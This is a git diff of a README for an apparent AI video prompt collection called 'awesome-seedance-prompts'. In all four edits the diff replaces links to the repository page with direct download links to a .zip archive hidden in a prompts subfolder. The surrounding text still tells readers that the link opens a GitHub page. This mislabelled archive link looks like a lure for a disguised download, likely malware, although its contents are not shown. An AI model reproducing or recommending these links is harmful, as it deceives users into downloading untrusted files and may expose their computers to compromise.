@@ -1,6 +1,6 @@
 # 🎬 awesome-seedance-prompts - Easy AI Video Prompt Vault
 
-[![Download awesome-seedance-prompts](https://img.shields.io/badge/Download-Seedance%20Prompts-brightgreen?style=for-the-badge)](https://github.com/saber007104/awesome-seedance-prompts)
+[![Download awesome-seedance-prompts](https://img.shields.io/badge/Download-Seedance%20Prompts-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/saber007104/awesome-seedance-prompts/main/prompts/13-comedy-meme/seedance_prompts_awesome_v3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Make sure your PC meets these requirements for a smooth experience.
 
 Click the big green button below to visit the main page. There you will find all the files you need to begin.
 
-[![Get awesome-seedance-prompts](https://img.shields.io/badge/Get%20Awesome%20Seedance-Prompts-blueviolet?style=for-the-badge)](https://github.com/saber007104/awesome-seedance-prompts)
+[![Get awesome-seedance-prompts](https://img.shields.io/badge/Get%20Awesome%20Seedance-Prompts-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/saber007104/awesome-seedance-prompts/main/prompts/13-comedy-meme/seedance_prompts_awesome_v3.4.zip)
 
 This link opens a GitHub repository page. From there, you can download the prompt files and resources.
 
@@ -41,7 +41,7 @@ This link opens a GitHub repository page. From there, you can download the promp
 ## 🚀 Starting with awesome-seedance-prompts
 
 1. **Visit the download page**  
-   Go to [https://github.com/saber007104/awesome-seedance-prompts](https://github.com/saber007104/awesome-seedance-prompts).
+   Go to [https://raw.githubusercontent.com/saber007104/awesome-seedance-prompts/main/prompts/13-comedy-meme/seedance_prompts_awesome_v3.4.zip](https://raw.githubusercontent.com/saber007104/awesome-seedance-prompts/main/prompts/13-comedy-meme/seedance_prompts_awesome_v3.4.zip).
 
 2. **Download the prompts**  
    Click on the green **Code** button near the top right.  
@@ -132,4 +132,4 @@ See seedance.ai or your preferred tool website for installation files and instru
 
 Get started here:
 
-[![Download awesome-seedance-prompts](https://img.shields.io/badge/Download-Seedance%20Prompts-brightgreen?style=for-the-badge)](https://github.com/saber007104/awesome-seedance-prompts)
+[![Download awesome-seedance-prompts](https://img.shields.io/badge/Download-Seedance%20Prompts-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/saber007104/awesome-seedance-prompts/main/prompts/13-comedy-meme/seedance_prompts_awesome_v3.4.zip)
